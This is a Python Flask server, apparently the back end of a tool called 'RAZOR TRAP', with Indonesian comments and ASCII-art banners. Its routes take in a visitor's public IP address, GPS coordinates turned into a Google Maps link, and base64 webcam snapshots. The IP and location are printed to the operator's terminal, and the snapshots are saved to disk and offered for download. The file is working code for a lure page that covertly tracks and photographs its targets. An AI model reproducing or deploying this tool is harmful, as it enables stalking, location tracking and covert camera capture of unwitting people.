from flask import Flask, render_template, request, jsonify, send_from_directory, url_for
import os
import base64
import time
import requests

R = '\033[31m'  # Merah
Y = '\033[33m'  # Kuning
B = '\033[34m'  # Biru
W = '\033[0m'   # Reset
C = '\033[36m'  # Cyan
G = '\033[32m'  # Hijau
M = '\033[35m' 

app = Flask(__name__)

if not os.path.exists("static/result/image"):
    os.makedirs("static/result/image")

ascii_art1 = f"""
{B}⠀⠀⠀⠀⠀       ⢀⣴⣾⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{C}⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠾⠛⠉⠀⠙⠛⠿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Y}⠀⠀⠀⠀⠀⠀⠀⢠⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⠀⠀⠀⠀⠀⠀⠀⠀
{G}⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀
{R}⠀⠀⠀⠀⠀⠀⠀⠘⢿⣦⡀⠀⠀⢀⣠⠤⠴⠶⢤⣄⡀⠈⣿⡇⠀⠀⠀⠀⠀⠀
{Y}⠀⠀⠀⠀⠀⠀⠀⢠⡞⠉⢻⣷⠟⠉⠀⠈⠙⠒⠶⠮⠿⢿⣿⠃⠀⠀⠀⠀⠀⠀
{B}⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣦⣈⠙⠳⢦⣄⠀⠀⠀⠀⠀⠈⠙⠳⣄⠀⠀⠀⠀⠀
{C}⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣶⣄⠀⠙⢿⣿⠛⠛⠙⢦⡀⠀⠈⠙⢦⡀⠀⠀
{G}⠀⠀⠀⣀⣴⠟⠉⠉⠙⠻⣿⣿⣿⣿⣷⣄⣀⣽⣶⣤⣴⠟⠻⣦⠀⠀⠀⠙⢦⠀
{R}⠀⠀⢰⣿⣿⣿⣷⣤⣀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⠿⠟⠀⠀⠈⠳⢦⣀⠀⢸⡄
{Y}⠀⢠⡟⠁⠀⠀⠉⠛⠿⣿⣶⣄⡀⠀⠙⠿⠿⠿⠟⢀⣤⡾⠿⠛⠓⠒⠚⠛⠛⠁
{B}⠀⠈⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀
{C}⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⠁⢹⣿⣿⣿⣿⣿⣿⠏⠙⠳⣄⠀⠀⠀⠀⠀⠀⠀
{Y}⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠉⠉⠙⠛⠉⠀⠀⠀⠀⠘⠳⣄⠀⠀⠀⠀⠀
{G}⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢦⣄⠀⠀⠀
{R}⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀
{M}⠀⠀⠀⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⠀
{W}⠀⠀⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇
"""

ascii_art2 = f"""
{R}          ███████{Y}░░░░{R}███████
       ██{Y}░░░░░██{R}░░██{Y}░░░░░██
       ██{Y}░░░░░██{R}░░██{Y}░░░░░██
       ██{Y}░░░░░██{R}░░██{Y}░░░░░██
    ███████{Y}░░░░░{R}███████
   ██{Y}░░░░░░░░░░░░░░{R}██
  ██{Y}░░░░░░░░░░░░░░░░{R}██
 ██{Y}░░░░░░░░░░░░░░░░░░░░{R}██
██{Y}░░░░░░░░░░░░░░░░░░░░░░░░{R}██
  ░░ ░░░░░░░░░░░░░░░░░░░░░░ ░░ 
{B}      R A Z O R   T R A P
{W}
"""

def show_aciart():
    combined_art = '\n'.join(line1 + '   ' + line2 for line1, line2 in zip(ascii_art1.splitlines(), ascii_art2.splitlines()))
    print(combined_art)

@app.route("/")
def index():
    return render_template("index.html")

@app.route('/get_ip', methods=['GET'])
def get_ip():
    ip = requests.get('https://api.ipify.org?format=json').json()['ip']
    return jsonify({'ip': ip})

@app.route("/get_location", methods=["POST"])
def get_location():
    data = request.json
    latitude = data.get("latitude")
    longitude = data.get("longitude")
    location_url = f"https://www.google.com/maps?q={latitude},{longitude}"
    return jsonify({"location_url": location_url})

@app.route("/capture_image", methods=["POST"])
def capture_image():
    image_data = request.json.get("image_data")
    image_filename = f"image_{int(time.time())}.png"
    image_path = os.path.join("static/result/image", image_filename)
    
    with open(image_path, "wb") as img_file:
        img_file.write(base64.b64decode(image_data))
    
    image_url = url_for('static', filename=f'result/image/{image_filename}', _external=True)

    return jsonify({"status": "success", "image_url": image_url})

@app.route('/send_ip', methods=['POST'])
def send_ip():
    data = request.get_json()
    ip_address = data.get('ip')
    print(f"IP Publik: {ip_address}")
    return jsonify({'status': 'success'})
    
@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.json
    location_url = data.get("location_url")
    print(f"User Location: {location_url}")
    return jsonify({"status": "success"})

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    return send_from_directory('static/result/image', filename, as_attachment=True)

@app.route("/aciart", methods=["GET"])
def aciart():
    show_aciart()
    return jsonify({"ascii_art": "ASCII art displayed in terminal"})

if __name__ == "__main__":
    show_aciart()
    app.run(port=4040)

